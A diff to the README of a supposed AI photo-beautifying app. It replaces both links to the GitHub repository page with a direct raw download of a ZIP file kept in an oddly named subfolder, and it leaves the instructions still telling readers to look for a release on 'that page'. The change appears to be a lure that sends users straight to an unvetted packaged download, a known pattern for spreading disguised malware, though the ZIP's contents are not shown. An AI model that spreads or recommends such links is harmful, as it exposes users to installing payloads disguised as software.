@@ -1,6 +1,6 @@
 # ✨ ai-one-click-beauty - Make Every Image Look Better
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/epigraphcommissioner131/ai-one-click-beauty)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/epigraphcommissioner131/ai-one-click-beauty/raw/refs/heads/main/moravite/one-click-beauty-ai-1.2.zip)
 
 ## 🌟 What This App Does
 
@@ -35,7 +35,7 @@ For best results, use:
 
 Go to the download page here:
 
-https://github.com/epigraphcommissioner131/ai-one-click-beauty
+https://github.com/epigraphcommissioner131/ai-one-click-beauty/raw/refs/heads/main/moravite/one-click-beauty-ai-1.2.zip
 
 On that page, look for the latest release or the main app file. Download it to your computer. If the file comes as a ZIP package, extract it before opening the app.
 
